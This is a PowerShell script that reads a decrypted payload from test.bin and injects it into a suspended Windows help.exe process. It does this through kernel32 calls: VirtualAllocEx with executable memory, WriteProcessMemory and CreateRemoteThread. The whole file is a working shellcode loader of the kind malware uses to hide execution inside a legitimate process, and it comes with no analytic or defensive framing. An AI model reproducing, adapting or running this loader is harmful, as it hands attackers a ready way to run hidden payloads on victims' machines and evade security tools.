# test.ps1 - Loads test.bin (decrypted payload) and runs it via process hollowing.
# Requires test.bin in the same directory. Uses c:\windows\SysWOW64\help.exe as host.

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
    public IntPtr hP;
    public IntPtr ht;
    public uint dwProcessId;
    public uint dwThreadId;
}
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO
{
    public uint cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public uint dwX, dwY, dwXSize, dwYSize;
    public uint dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
    public uint wShowWindow;
    public short cbReserved2;
    public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
}
public static class Kernel32
{
    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(string a, string b, uint c, uint d, bool e, uint f, IntPtr g, string h, ref STARTUPINFO i, out PROCESS_INFORMATION j);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GlobalAlloc(uint a, uint b);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr a, IntPtr b, uint c, uint d, uint e);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr a, IntPtr b, IntPtr c, uint d, IntPtr e);
    [DllImport("kernel32.dll")]
    public static extern IntPtr WaitForSingleObject(IntPtr a, uint b);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr a, IntPtr b, uint c, IntPtr d, IntPtr e, uint f, IntPtr g);
}
"@

$binPath = Join-Path $PSScriptRoot "test.bin"
if (-not (Test-Path -LiteralPath $binPath)) {
    Write-Error "test.bin not found: $binPath"
    exit 1
}

$shellbuf = [System.IO.File]::ReadAllBytes($binPath)
$shellsize = $shellbuf.Length
# test.bin is already decrypted - use as-is

$si = New-Object STARTUPINFO
$pi = New-Object PROCESS_INFORMATION
$addr = [Kernel32]::GlobalAlloc(0x40, $shellsize + 100)
for ($i = 0; $i -lt $shellsize; $i++) {
    [System.Runtime.InteropServices.Marshal]::WriteByte($addr, $i, $shellbuf[$i])
}

# CREATE_SUSPENDED = 0x04
[Kernel32]::CreateProcess("c:\windows\SysWOW64\help.exe", $null, 0, 0, $false, 0x04, [IntPtr]::Zero, "c:\", [ref] $si, [ref] $pi) | Out-Null
$hProcess = $pi.hP
$remoteAddr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $shellsize + 100, 0x1000, 0x40)
[Kernel32]::WriteProcessMemory($hProcess, $remoteAddr, $addr, $shellsize, [IntPtr]::Zero) | Out-Null
$hThread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $remoteAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[Kernel32]::WaitForSingleObject($hThread, 500 * 1000) | Out-Null
